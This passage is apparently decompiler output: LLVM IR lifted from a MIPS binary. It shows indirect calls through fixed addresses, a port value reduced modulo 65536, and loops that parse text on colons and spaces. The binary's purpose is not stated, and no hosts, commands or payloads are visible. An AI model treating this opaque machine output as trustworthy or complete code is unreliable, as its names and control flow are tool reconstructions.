  store i32 19, i32* %a0.global-to-local, align 4
  %v3_4012a4 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4012a4, i32* @t9, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_4012ac = call i32 @function_400fc4(i32 19, i32 23, i32 ptrtoint (i32* @global_var_4080ec.75 to i32))
  store i32 %v4_4012ac, i32* %v0.global-to-local, align 4
  store i32 20, i32* %a0.global-to-local, align 4
  %v3_4012c0 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4012c0, i32* @t9, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_4012c8 = call i32 @function_400fc4(i32 20, i32 23, i32 ptrtoint (i32* @global_var_408104.76 to i32))
  store i32 %v4_4012c8, i32* %v0.global-to-local, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v3_4012dc = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4012dc, i32* @t9, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  %v5_4012e4 = call i32 @function_400fc4(i32 21, i32 2, i32 ptrtoint ([3 x i8]* @global_var_40811c.77 to i32))
  store i32 %v5_4012e4, i32* %v0.global-to-local, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  %v3_4012f8 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4012f8, i32* @t9, align 4
  store i32 15, i32* %a1.global-to-local, align 4
  %v4_401300 = call i32 @function_400fc4(i32 25, i32 15, i32 ptrtoint (i32* @global_var_408120.78 to i32))
  store i32 %v4_401300, i32* %v0.global-to-local, align 4
  store i32 26, i32* %a0.global-to-local, align 4
  %v3_401314 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401314, i32* @t9, align 4
  store i32 12, i32* %a1.global-to-local, align 4
  %v4_40131c = call i32 @function_400fc4(i32 26, i32 12, i32 ptrtoint (i32* @global_var_408130.79 to i32))
  store i32 %v4_40131c, i32* %v0.global-to-local, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v3_401330 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401330, i32* @t9, align 4
  store i32 12, i32* %a1.global-to-local, align 4
  %v4_401338 = call i32 @function_400fc4(i32 27, i32 12, i32 ptrtoint (i32* @global_var_408140.80 to i32))
  store i32 %v4_401338, i32* %v0.global-to-local, align 4
  store i32 %v0_401088, i32* @ra, align 4
  %v3_40134c = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_40134c, i32* @t9, align 4
  store i32 28, i32* %a0.global-to-local, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v7_40135c = call i32 @function_400fc4(i32 28, i32 23, i32 ptrtoint (i32* @global_var_408150.81 to i32))
  store i32 %v7_40135c, i32* %v0.global-to-local, align 4
  %v1_40136c = load i32, i32* @t9, align 4
  %v1_401370 = add i32 %v1_40136c, 294808
  %v2_401370 = inttoptr i32 %v1_401370 to i32*
  %v3_401370 = load i32, i32* %v2_401370, align 4
  store i32 %v3_401370, i32* %v0.global-to-local, align 4
  store i32 2036692075, i32* %t9.global-to-local, align 4
  %v1_401378 = inttoptr i32 %v3_401370 to i32*
  %v2_401378 = load i32, i32* %v1_401378, align 4
  store i32 %v2_401378, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_branch(i32 2036692075)
  %v0_401394 = load i32, i32* @ra, align 4
  %v0_40139c = load i32, i32* @s7, align 4
  %v0_4013a4 = load i32, i32* @s5, align 4
  %v0_4013ac = load i32, i32* @s3, align 4
  %v0_4013b4 = load i32, i32* @s1, align 4
  %v0_4013b8 = load i32, i32* @s0, align 4
  %v3_4013c0 = load i32, i32* inttoptr (i32 2036986951 to i32*), align 4
  store i32 %v3_4013c0, i32* %t9.global-to-local, align 4
  %v0_4013c4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4013c4 = urem i32 %v0_4013c4, 65536
  store i32 %v1_4013c4, i32* %s1.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_4013cc = ptrtoint i32* %stack_var_-8239 to i32
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4013c0)
  %v2_4013dc = ptrtoint i32* %stack_var_-4143 to i32
  store i32 %v2_4013dc, i32* %a0.global-to-local, align 4
  %v3_4013e0 = load i32, i32* inttoptr (i32 2036986951 to i32*), align 4
  store i32 %v3_4013e0, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4013e0)
  %v2_4013f4 = ptrtoint i32* %stack_var_-8752 to i32
  store i32 %v2_4013f4, i32* %a0.global-to-local, align 4
  %v3_4013f8 = load i32, i32* inttoptr (i32 2036986951 to i32*), align 4
  store i32 %v3_4013f8, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4013f8)
  %v2_40140c = ptrtoint i32* %stack_var_-8784 to i32
  store i32 %v2_40140c, i32* %a0.global-to-local, align 4
  %v3_401410 = load i32, i32* inttoptr (i32 2036986951 to i32*), align 4
  store i32 %v3_401410, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401410)
  %v2_401424 = ptrtoint i8* %stack_var_-8768 to i32
  store i32 %v2_401424, i32* %s0.global-to-local, align 4
  %v3_401428 = load i32, i32* inttoptr (i32 2036986887 to i32*), align 4
  store i32 %v3_401428, i32* %t9.global-to-local, align 4
  %v0_40142c = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_40142c, i32* %a0.global-to-local, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401428)
  %v3_401444 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401444, i32* %t9.global-to-local, align 4
  store i32 %v2_401424, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401444)
  store i32 2, i32* %v1.global-to-local, align 4
  %v0_40145c = load i32, i32* %v0.global-to-local, align 4
  %v2_40145c = icmp eq i32 %v0_40145c, 2
  store i32 48, i32* %v0.global-to-local, align 4
  br i1 %v2_40145c, label %dec_label_pc_401460, label %dec_label_pc_401484

dec_label_pc_401460:                              ; preds = %dec_label_pc_401078
  %v4_401470 = zext i8 %tmp39 to i32
  store i32 %v4_401470, i32* %v1.global-to-local, align 4
  store i8 48, i8* %stack_var_-8768, align 1
  br label %dec_label_pc_401484

dec_label_pc_401484:                              ; preds = %dec_label_pc_401078, %dec_label_pc_401460
  %v3_401484 = load i32, i32* inttoptr (i32 2036986899 to i32*), align 4
  store i32 %v3_401484, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401484)
  %v3_40149c = load i32, i32* inttoptr (i32 2036986899 to i32*), align 4
  store i32 %v3_40149c, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40149c)
  %v3_4014b4 = load i32, i32* inttoptr (i32 2036986899 to i32*), align 4
  store i32 %v3_4014b4, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014b4)
  %v3_4014cc = load i32, i32* inttoptr (i32 2036986899 to i32*), align 4
  store i32 %v3_4014cc, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014cc)
  %v3_4014e4 = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_4014e4, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014e4)
  %v0_4014f8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4014f8, i32* %a0.global-to-local, align 4
  %v3_4014fc = load i32, i32* inttoptr (i32 2036986787 to i32*), align 4
  store i32 %v3_4014fc, i32* %t9.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4014fc)
  %v0_40150c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40150c, i32* %s2.global-to-local, align 4
  %v2_401518 = icmp eq i32 %v0_40150c, -1
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_401518, label %dec_label_pc_401484.dec_label_pc_401528_crit_edge, label %dec_label_pc_4016c4

dec_label_pc_401484.dec_label_pc_401528_crit_edge: ; preds = %dec_label_pc_401484
  %v1_40152c.pre.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_401528

dec_label_pc_401528:                              ; preds = %dec_label_pc_401484.dec_label_pc_401528_crit_edge, %dec_label_pc_4016c4
  %v1_40152c.pre = phi i32 [ %v1_40152c.pre.pre, %dec_label_pc_401484.dec_label_pc_401528_crit_edge ], [ 0, %dec_label_pc_4016c4 ]
  store i32 %v2_4013f4, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_40152c

dec_label_pc_40152c:                              ; preds = %dec_label_pc_40153c, %dec_label_pc_401528
  %v3_401540 = phi i32 [ %v4_401540, %dec_label_pc_40153c ], [ %v1_40152c.pre, %dec_label_pc_401528 ]
  %v2_40152c = add i32 %v3_401540, %v2_4013f4
  store i32 %v2_40152c, i32* %v0.global-to-local, align 4
  %v1_401530 = inttoptr i32 %v2_40152c to i8*
  %v2_401530 = load i8, i8* %v1_401530, align 1
  %v3_401530 = sext i8 %v2_401530 to i32
  store i32 %v3_401530, i32* %a0.global-to-local, align 4
  %v1_401538 = icmp eq i8 %v2_401530, 0
  store i32 58, i32* %v0.global-to-local, align 4
  br i1 %v1_401538, label %dec_label_pc_4016c4, label %dec_label_pc_40153c

dec_label_pc_40153c:                              ; preds = %dec_label_pc_40152c
  %v2_401540 = icmp eq i8 %v2_401530, 58
  %v4_401540 = add i32 %v3_401540, 1
  store i32 %v4_401540, i32* %v1.global-to-local, align 4
  br i1 %v2_401540, label %dec_label_pc_401544, label %dec_label_pc_40152c

dec_label_pc_401544:                              ; preds = %dec_label_pc_40153c
  store i32 %v3_401540, i32* %v1.global-to-local, align 4
  %v1_40154c = add i32 %v3_401540, 2
  store i32 %v1_40154c, i32* %a0.global-to-local, align 4
  %v2_401550 = add i32 %v1_40154c, %v2_4013f4
  store i32 %v2_401550, i32* %v0.global-to-local, align 4
  store i32 %v1_40154c, i32* %s1.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_40155c

dec_label_pc_40155c:                              ; preds = %dec_label_pc_401568, %dec_label_pc_401544
  %v3_40156c = phi i32 [ %v4_40156c, %dec_label_pc_401568 ], [ %v1_40154c, %dec_label_pc_401544 ]
  %v0_40155c = phi i32 [ %v3_401564, %dec_label_pc_401568 ], [ %v2_401550, %dec_label_pc_401544 ]
  %v1_40155c = inttoptr i32 %v0_40155c to i8*
  %v2_40155c = load i8, i8* %v1_40155c, align 1
  %v3_40155c = sext i8 %v2_40155c to i32
  store i32 %v3_40155c, i32* %v1.global-to-local, align 4
  %v1_401564 = icmp eq i8 %v2_40155c, 0
  %v3_401564 = add i32 %v0_40155c, 1
  store i32 %v3_401564, i32* %v0.global-to-local, align 4
  br i1 %v1_401564, label %dec_label_pc_401578, label %dec_label_pc_401568

dec_label_pc_401568:                              ; preds = %dec_label_pc_40155c
  %v2_40156c = icmp eq i8 %v2_40155c, 32
  %v4_40156c = add i32 %v3_40156c, 1
  store i32 %v4_40156c, i32* %s1.global-to-local, align 4
  br i1 %v2_40156c, label %dec_label_pc_401570, label %dec_label_pc_40155c

dec_label_pc_401570:                              ; preds = %dec_label_pc_401568
  store i32 %v3_40156c, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_401578

dec_label_pc_401578:                              ; preds = %dec_label_pc_40155c, %dec_label_pc_401570
  store i32 %v2_4013f4, i32* %s0.global-to-local, align 4
  %v3_40157c = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_40157c, i32* %t9.global-to-local, align 4
  store i32 %v2_401550, i32* %s0.global-to-local, align 4
  %v0_401584 = load i32, i32* @sp, align 4
  %v2_401584 = add i32 %v0_401584, %v3_40156c
  store i32 %v2_401584, i32* %v0.global-to-local, align 4
  store i32 %v2_401550, i32* %a0.global-to-local, align 4
  %v2_40158c = add i32 %v2_401584, 56
  %v3_40158c = inttoptr i32 %v2_40158c to i8*
  store i8 0, i8* %v3_40158c, align 1
  call void @__pseudo_call(i32 %v3_40157c)
  %v0_401598 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_401598, i32* %a0.global-to-local, align 4
  %v3_40159c = load i32, i32* inttoptr (i32 2036987267 to i32*), align 4
  store i32 %v3_40159c, i32* %t9.global-to-local, align 4
  %v0_4015a0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4015a0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40159c)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_4015b4 = load i32, i32* %v0.global-to-local, align 4
  %v2_4015b4 = icmp eq i32 %v0_4015b4, -1
  br i1 %v2_4015b4, label %dec_label_pc_4016c4, label %dec_label_pc_4015b8

dec_label_pc_4015b8:                              ; preds = %dec_label_pc_401578
  %v3_4015b4 = load i32, i32* %s1.global-to-local, align 4
  %v4_4015b4 = add i32 %v3_4015b4, 1
  store i32 0, i32* @a3, align 4
  br label %dec_label_pc_4015c8

dec_label_pc_4015c8:                              ; preds = %dec_label_pc_401630, %dec_label_pc_4015b8
  %v0_40164819 = phi i32 [ %v0_40164820, %dec_label_pc_401630 ], [ 0, %dec_label_pc_4015b8 ]
  %v0_40161815 = phi i32 [ %v0_40161816, %dec_label_pc_401630 ], [ 0, %dec_label_pc_4015b8 ]
  %v2_401640 = phi i32 [ %v3_401640, %dec_label_pc_401630 ], [ %v4_4015b4, %dec_label_pc_4015b8 ]
  %v0_4015d4 = phi i32 [ %v3_401638, %dec_label_pc_401630 ], [ -1, %dec_label_pc_4015b8 ]
  %v2_4015cc = icmp eq i32 %v0_4015d4, 32
  store i32 9, i32* %v0.global-to-local, align 4
  br i1 %v2_4015cc, label %dec_label_pc_401614, label %dec_label_pc_4015d0

dec_label_pc_4015d0:                              ; preds = %dec_label_pc_4015c8
  %v2_4015d4 = icmp eq i32 %v0_4015d4, 9
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_4015d4, label %dec_label_pc_401614, label %dec_label_pc_4015d8

dec_label_pc_4015d8:                              ; preds = %dec_label_pc_4015d0
  %v0_4015dc = load i32, i32* %a1.global-to-local, align 4
  %v2_4015dc = icmp eq i32 %v0_4015dc, 1
  br i1 %v2_4015dc, label %dec_label_pc_4015e0, label %dec_label_pc_40160c

dec_label_pc_4015e0:                              ; preds = %dec_label_pc_4015d8
  %v1_4015e4 = add i32 %v0_40161815, 1
  store i32 %v1_4015e4, i32* @a3, align 4
  %v2_4015e8 = icmp eq i32 %v0_40161815, 0
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_4015e8, label %dec_label_pc_4015ec, label %dec_label_pc_401618

dec_label_pc_4015ec:                              ; preds = %dec_label_pc_4015e0
  %v0_4015f0 = load i32, i32* @sp, align 4
  %v2_4015f0 = add i32 %v0_4015f0, %v2_401640
  store i32 %v2_4015f0, i32* %v0.global-to-local, align 4
  %v1_4015f4 = add i32 %v2_4015f0, 57
  %v2_4015f4 = inttoptr i32 %v1_4015f4 to i8*
  %v3_4015f4 = load i8, i8* %v2_4015f4, align 1
  %v4_4015f4 = sext i8 %v3_4015f4 to i32
  store i32 %v4_4015f4, i32* %v1.global-to-local, align 4
  %v2_4015fc = icmp eq i8 %v3_4015f4, 65
  store i32 %v2_4015f0, i32* %v0.global-to-local, align 4
  br i1 %v2_4015fc, label %dec_label_pc_401600, label %dec_label_pc_401630

dec_label_pc_401600:                              ; preds = %dec_label_pc_4015ec
  br label %dec_label_pc_40160c

dec_label_pc_40160c:                              ; preds = %dec_label_pc_4015d8, %dec_label_pc_401600
  %v0_40164824 = phi i32 [ %v0_40164819, %dec_label_pc_4015d8 ], [ 1, %dec_label_pc_401600 ]
  %v0_40161813 = phi i32 [ %v0_40161815, %dec_label_pc_4015d8 ], [ 1, %dec_label_pc_401600 ]
  store i32 0, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_401614

dec_label_pc_401614:                              ; preds = %dec_label_pc_4015d0, %dec_label_pc_4015c8, %dec_label_pc_40160c
  %v0_40164823 = phi i32 [ %v0_40164819, %dec_label_pc_4015d0 ], [ %v0_40164819, %dec_label_pc_4015c8 ], [ %v0_40164824, %dec_label_pc_40160c ]
  %v0_40161814 = phi i32 [ %v0_40161815, %dec_label_pc_4015d0 ], [ %v0_40161815, %dec_label_pc_4015c8 ], [ %v0_40161813, %dec_label_pc_40160c ]
  store i32 1, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_401618

dec_label_pc_401618:                              ; preds = %dec_label_pc_4015e0, %dec_label_pc_401614
  %v0_40164822 = phi i32 [ %v0_40164819, %dec_label_pc_4015e0 ], [ %v0_40164823, %dec_label_pc_401614 ]
  %v0_401618 = phi i32 [ %v1_4015e4, %dec_label_pc_4015e0 ], [ %v0_40161814, %dec_label_pc_401614 ]
  %v1_401618 = icmp slt i32 %v0_401618, 7
  %v2_401618 = zext i1 %v1_401618 to i32
  store i32 %v2_401618, i32* %v0.global-to-local, align 4
  %v1_40161c = icmp eq i1 %v1_401618, false
  %v2_40161c = load i32, i32* %a0.global-to-local, align 4
  %v3_40161c = add i32 %v2_40161c, 1
  store i32 %v3_40161c, i32* %a0.global-to-local, align 4
  br i1 %v1_40161c, label %dec_label_pc_401648, label %dec_label_pc_401620

dec_label_pc_401620:                              ; preds = %dec_label_pc_401618
  %v0_40162c = load i32, i32* @sp, align 4
  %v2_40162c = add i32 %v0_40162c, %v2_401640
  store i32 %v2_40162c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401630

dec_label_pc_401630:                              ; preds = %dec_label_pc_4015ec, %dec_label_pc_401620
  %v0_40164820 = phi i32 [ %v0_40164819, %dec_label_pc_4015ec ], [ %v0_40164822, %dec_label_pc_401620 ]
  %v0_401630 = phi i32 [ %v2_4015f0, %dec_label_pc_4015ec ], [ %v2_40162c, %dec_label_pc_401620 ]
  %v0_40161816 = phi i32 [ 1, %dec_label_pc_4015ec ], [ %v0_401618, %dec_label_pc_401620 ]
  %v1_401630 = add i32 %v0_401630, 57
  store i32 %v1_401630, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v1_401638 = inttoptr i32 %v1_401630 to i8*
  %v2_401638 = load i8, i8* %v1_401638, align 1
  %v3_401638 = sext i8 %v2_401638 to i32
  store i32 %v3_401638, i32* %v1.global-to-local, align 4
  %v1_401640 = icmp eq i8 %v2_401638, 0
  %v3_401640 = add i32 %v2_401640, 1
  br i1 %v1_401640, label %dec_label_pc_401648, label %dec_label_pc_4015c8

dec_label_pc_401648:                              ; preds = %dec_label_pc_401630, %dec_label_pc_401618
  %v1_401680 = phi i32 [ %v3_401640, %dec_label_pc_401630 ], [ %v2_401640, %dec_label_pc_401618 ]
  %v0_401648 = phi i32 [ %v0_40164820, %dec_label_pc_401630 ], [ %v0_40164822, %dec_label_pc_401618 ]
  %v1_401648 = icmp eq i32 %v0_401648, 0
  store i32 %v1_401680, i32* %a0.global-to-local, align 4
  br i1 %v1_401648, label %dec_label_pc_4016c4, label %dec_label_pc_40164c

dec_label_pc_40164c:                              ; preds = %dec_label_pc_401648
  %v2_401654 = add i32 %v1_401680, %v2_4013f4
  store i32 %v2_401654, i32* %v0.global-to-local, align 4
  store i32 32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_40165c

dec_label_pc_40165c:                              ; preds = %dec_label_pc_401668, %dec_label_pc_40164c
  %v3_40166c = phi i32 [ %v4_40166c, %dec_label_pc_401668 ], [ %v1_401680, %dec_label_pc_40164c ]
  %v0_40165c = phi i32 [ %v3_401664, %dec_label_pc_401668 ], [ %v2_401654, %dec_label_pc_40164c ]
  %v1_40165c = inttoptr i32 %v0_40165c to i8*
  %v2_40165c = load i8, i8* %v1_40165c, align 1
  %v3_40165c = sext i8 %v2_40165c to i32
  store i32 %v3_40165c, i32* %v1.global-to-local, align 4
  %v1_401664 = icmp eq i8 %v2_40165c, 0
  %v3_401664 = add i32 %v0_40165c, 1
  store i32 %v3_401664, i32* %v0.global-to-local, align 4
  br i1 %v1_401664, label %dec_label_pc_401678, label %dec_label_pc_401668

dec_label_pc_401668:                              ; preds = %dec_label_pc_40165c
  %v2_40166c = icmp eq i8 %v2_40165c, 32
  %v4_40166c = add i32 %v3_40166c, 1
  br i1 %v2_40166c, label %dec_label_pc_401670, label %dec_label_pc_40165c

dec_label_pc_401670:                              ; preds = %dec_label_pc_401668
  br label %dec_label_pc_401678

dec_label_pc_401678:                              ; preds = %dec_label_pc_40165c, %dec_label_pc_401670
  store i32 %v2_4013f4, i32* %v0.global-to-local, align 4
  store i32 %v2_40140c, i32* %s1.global-to-local, align 4
  store i32 %v2_401654, i32* %s0.global-to-local, align 4
  %v3_401684 = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_401684, i32* %t9.global-to-local, align 4
  %v2_401688 = add i32 %v3_40166c, %v2_40140c
  store i32 %v2_401688, i32* %v0.global-to-local, align 4
  %v1_40168c = add i32 %v2_401688, 32
  %v2_40168c = inttoptr i32 %v1_40168c to i8*
  store i8 0, i8* %v2_40168c, align 1
  %v1_401690 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_401690, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401684)
  %v0_401698 = load i32, i32* %v0.global-to-local, align 4
  %v1_401698 = icmp slt i32 %v0_401698, 16
  %v2_401698 = zext i1 %v1_401698 to i32
  store i32 %v2_401698, i32* %v0.global-to-local, align 4
  %v1_4016a0 = icmp eq i1 %v1_401698, false
  store i32 %v2_40140c, i32* %a0.global-to-local, align 4
  br i1 %v1_4016a0, label %dec_label_pc_4016c4, label %dec_label_pc_4016a4

dec_label_pc_4016a4:                              ; preds = %dec_label_pc_401678
  %v3_4016a8 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_4016a8, i32* %t9.global-to-local, align 4
  %v1_4016b0 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_4016b0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4016a8)
  br label %dec_label_pc_4016c4

dec_label_pc_4016c4:                              ; preds = %dec_label_pc_40152c, %dec_label_pc_401484, %dec_label_pc_401678, %dec_label_pc_401648, %dec_label_pc_401578, %dec_label_pc_4016a4
  %v3_4016c4 = load i32, i32* inttoptr (i32 2036987227 to i32*), align 4
  store i32 %v3_4016c4, i32* %t9.global-to-local, align 4
  store i32 %v2_4013f4, i32* %a0.global-to-local, align 4
  store i32 512, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4016c4)
  %v0_4016dc = load i32, i32* %v0.global-to-local, align 4
  %v1_4016dc = icmp eq i32 %v0_4016dc, 0
  store i32 0, i32* @v1, align 4
  br i1 %v1_4016dc, label %dec_label_pc_4016e0, label %dec_label_pc_401528

dec_label_pc_4016e0:                              ; preds = %dec_label_pc_4016c4
  %v3_4016e4 = load i32, i32* inttoptr (i32 2036986739 to i32*), align 4
  store i32 %v3_4016e4, i32* %t9.global-to-local, align 4
  %v1_4016ec = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_4016ec, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4016e4)
  %v3_4016fc = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_4016fc, i32* %t9.global-to-local, align 4
  store i32 %v2_40140c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4016fc)
  %v0_401710 = load i32, i32* %v0.global-to-local, align 4
  %v1_401710 = icmp eq i32 %v0_401710, 0
  br i1 %v1_401710, label %dec_label_pc_401714, label %dec_label_pc_40177c

dec_label_pc_401714:                              ; preds = %dec_label_pc_4016e0
  %v3_401718 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401718, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401718)
  %v3_401730 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401730, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401730)
  %v3_401748 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401748, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401748)
  %v3_401760 = load i32, i32* inttoptr (i32 2036987115 to i32*), align 4
  store i32 %v3_401760, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401760)
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40177c

dec_label_pc_40177c:                              ; preds = %dec_label_pc_4016e0, %dec_label_pc_401714
  %v3_40177c = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_40177c, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40177c)
  %v3_401794 = load i32, i32* inttoptr (i32 2036986915 to i32*), align 4
  store i32 %v3_401794, i32* %t9.global-to-local, align 4
  %v1_40179c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_40179c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401794)
  %v0_4017a8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4017a8 = icmp eq i32 %v0_4017a8, 0
  store i32 %v0_4017a8, i32* %s6.global-to-local, align 4
  br i1 %v1_4017a8, label %dec_label_pc_4017ac, label %dec_label_pc_4017b8

dec_label_pc_4017ac:                              ; preds = %dec_label_pc_40177c
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_4017b8

dec_label_pc_4017b8:                              ; preds = %dec_label_pc_40177c, %dec_label_pc_4017ac
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_4017c0.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4017c0

dec_label_pc_4017c0:                              ; preds = %dec_label_pc_401b64, %dec_label_pc_4017b8
  %v2_4017d4 = phi i32 [ %v0_401b78, %dec_label_pc_401b64 ], [ %v0_4017c0.pre, %dec_label_pc_4017b8 ]
  %v1_4017c0 = add i32 %v2_4017d4, 11
  %v2_4017c0 = inttoptr i32 %v1_4017c0 to i8*
  %v3_4017c0 = load i8, i8* %v2_4017c0, align 1
  %v4_4017c0 = zext i8 %v3_4017c0 to i32
  %v1_4017c8 = add nuw nsw i32 %v4_4017c0, 208
  %v1_4017cc = and i32 %v1_4017c8, 254
  %v1_4017d0 = icmp ult i32 %v1_4017cc, 10
  %v2_4017d0 = zext i1 %v1_4017d0 to i32
  store i32 %v2_4017d0, i32* %v0.global-to-local, align 4
  %v1_4017d4 = icmp eq i1 %v1_4017d0, false
  store i32 %v1_4017c0, i32* %s4.global-to-local, align 4
  br i1 %v1_4017d4, label %dec_label_pc_401b64, label %dec_label_pc_4017d8

dec_label_pc_4017d8:                              ; preds = %dec_label_pc_4017c0
  %v3_4017dc = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_4017dc, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017dc)
  store i32 %v2_4013cc, i32* %s1.global-to-local, align 4
  %v3_4017f4 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_4017f4, i32* %t9.global-to-local, align 4
  %v0_4017f8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4017f8, i32* %a1.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017f4)
  %v3_40180c = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_40180c, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40180c)
  %v0_401820 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_401820, i32* %a1.global-to-local, align 4
  %v3_401824 = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
  store i32 %v3_401824, i32* %t9.global-to-local, align 4
  %v1_40182c = load i32, i32* %s1.global-to-local, align 4
  %v2_40182c = load i32, i32* %v0.global-to-local, align 4
  %v3_40182c = add i32 %v2_40182c, %v1_40182c
  store i32 %v3_40182c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401824)
  %v3_40183c = load i32, i32* inttoptr (i32 2036987051 to i32*), align 4
  store i32 %v3_40183c, i32* %t9.global-to-local, align 4
  store i32 %v2_4013cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40183c)
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_401854 = load i32, i32* inttoptr (i32 2036987239 to i32*), align 4
  store i32 %v3_401854, i32* %t9.global-to-local, align 4
  %v1_40185c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_40185c, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401854)
  %v0_401868 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401868, i32* %a1.global-to-local, align 4
  %v3_40186c = load i32, i32* inttoptr (i32 2036986835 to i32*), align 4
